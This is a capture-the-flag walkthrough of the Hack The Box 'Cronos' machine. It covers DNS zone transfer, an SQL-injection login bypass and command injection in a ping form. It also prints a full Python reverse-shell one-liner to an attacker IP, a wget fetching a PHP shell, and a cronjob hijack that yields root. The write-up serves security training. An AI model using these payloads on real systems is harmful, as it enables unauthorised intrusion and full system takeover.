# CRONOS

## NMAP

```bash
                                                                                    
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ nmap 10.10.10.13     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 05:44 EDT
Nmap scan report for 10.10.10.13
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
                                                                                    
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ nmap 10.10.10.13 -p 22,53,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 05:44 EDT
Nmap scan report for 10.10.10.13
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## ENUMEARTION PORT 53

I used `nslookup` to look for domain name and found one `ns1.cronos.htb`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ nslookup                                                                    1 ⨯
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb
```

I tried to use dig for dns zone transfer and found another domain `admin.cronos.htb`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ dig axfr @ns1.cronos.htb cronos.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @ns1.cronos.htb cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 184 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Sat Sep 04 06:18:17 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)
```

## ADMIN.CRONOS.HTB

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos1.png)

I used `sqlmap` to check for any sqli vulnerbilities and found that the username parameter is vulnerable to `sleep based sql injections`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ sqlmap -u http://admin.cronos.htb --forms

...snip...

[06:47:05] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable  
```

Looking for payloads online I found this [resource](https://github.com/payloadbox/sql-injection-payload-list)

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos2.png)

Using `' or sleep(5)#` redirects us to `welcome.php`

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos3.png)

The form is performing `ping -c 1 ` command on the ip we supply to it.

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos4.png)

This can be exploited by using command injections 

Using `| id` executed the id command 

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos5.png)

## USER.TXT

I used `ls /home` to look for users

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos6.png)

Now I tried to read user.txt for user `noulis`

Using command `cat /home/noulis/user.txt`

![](https://github.com/Leo-2807/Writeups/blob/main/images/cronos7.png)

## ROOT.TXT

I used `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` as command to get back a revershell.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 55566
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ 
```

Running linpeas I found that `/var/www/laravel/artisan` is run as cronjob.

On doing google search I found this very helpful [article](https://fieldraccoon.github.io/posts/Linuxprivesc/) to gain shell as root.

So we need to upload a reverse shell and change it's name to `artisan` .
Since our reverse shell is also a php file it will be executed and we'll get a shell as root.

I start a http server on my machine using command `python -m SimpleHTTPServer`
and then used the command 'wget http://10.10.14.5:8000/shell.php' to download the shell on out victim machine.

```bash
www-data@cronos:/var/www/laravel$ wget http://10.10.14.5:8000/shell.php
wget http://10.10.14.5:8000/shell.php
--2021-09-04 15:44:35--  http://10.10.14.5:8000/shell.php
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2585 (2.5K) [application/octet-stream]
Saving to: 'shell.php'

shell.php           100%[===================>]   2.52K  --.-KB/s    in 0.001s  

2021-09-04 15:44:35 (2.37 MB/s) - 'shell.php' saved [2585/2585]

www-data@cronos:/var/www/laravel$ cp shell.php artisan
cp shell.php artisan
```

After a minute I get a shell as root on my machine

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/cronos]
└─$ nc -lvnp 9999                                                               1 ⨯
listening on [any] 9999 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 43556
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 15:46:01 up  2:54,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```



